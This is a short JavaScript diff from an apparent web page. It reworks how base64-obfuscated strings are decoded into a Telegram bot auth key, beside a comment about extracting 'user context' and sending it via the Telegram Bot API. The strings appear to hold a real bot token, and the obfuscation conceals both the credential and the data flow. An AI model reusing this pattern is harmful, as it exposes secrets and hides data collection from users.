@@ -270,13 +270,10 @@ document.querySelectorAll(".nav-back-btn").forEach(btn => {
 });
 
 // Ending screen actions: Extract user context & push hearts directly via Telegram Bot API
-const _0x4e2a = ["ODk0MzYyODgyNg==", "QUFIb2U1eDBHZG43NkhlWnJCNGF6WkNp", "enBONTdHUnd2Y0E="];
+const _0x4e2a = ["ODk0MzYyODgyNjo=", "QUFIb2U1eDBHZG43NkhlWnJCNGF6WkM=", "aXpwTjU3R1JndmNB"];
 function _getAuthKey() {
     try {
-        const p1 = atob(_0x4e2a[0]);
-        const p2 = atob(_0x4e2a[1]);
-        const p3 = atob(_0x4e2a[2]);
-        return `${p1}:${p2}${p3}`;
+        return atob(_0x4e2a[0]) + atob(_0x4e2a[1]) + atob(_0x4e2a[2]);
     } catch (e) {
         return "";
     }
